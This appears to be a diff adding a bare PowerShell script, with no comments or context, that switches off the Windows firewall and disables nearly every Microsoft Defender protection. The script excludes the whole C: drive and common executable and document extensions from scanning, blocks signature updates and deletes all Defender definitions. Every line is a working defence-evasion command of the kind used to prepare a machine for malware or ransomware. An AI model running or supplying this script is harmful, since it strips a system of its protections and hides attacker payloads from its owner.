@@ -1,0 +1,37 @@
+netsh advfirewall set allprofiles state off
+
+Set-MpPreference -ExclusionPath "c:\"
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableAutoExclusions $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableCatchupFullScan $true
+Set-MpPreference -DisableCatchupQuickScan $true
+Set-MpPreference -DisableDatagramProcessing $true
+Set-MpPreference -DisableDnsOverTcpParsing $true
+Set-MpPreference -DisableDnsParsing $true
+Set-MpPreference -DisableEmailScanning $true
+Set-MpPreference -DisableHttpParsing $true
+Set-MpPreference -DisableInboundConnectionFiltering $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableNetworkProtectionPerfTelemetry $true
+Set-MpPreference -DisableRdpParsing $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableRemovableDriveScanning $true
+Set-MpPreference -DisableRestorePoint $true
+Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
+Set-MpPreference -DisableScanningNetworkFiles $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableSshParsing $true
+Set-MpPreference -DisableTlsParsing $true
+Set-MpPreference -ExclusionExtension msi
+Set-MpPreference -ExclusionExtension doc
+Set-MpPreference -ExclusionExtension xls
+Set-MpPreference -ExclusionExtension exe
+Set-MpPreference -ExclusionExtension ps1
+Set-MpPreference -ExclusionExtension txt
+Set-MpPreference -ExclusionExtension js
+Set-MpPreference -ExclusionExtension hta
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
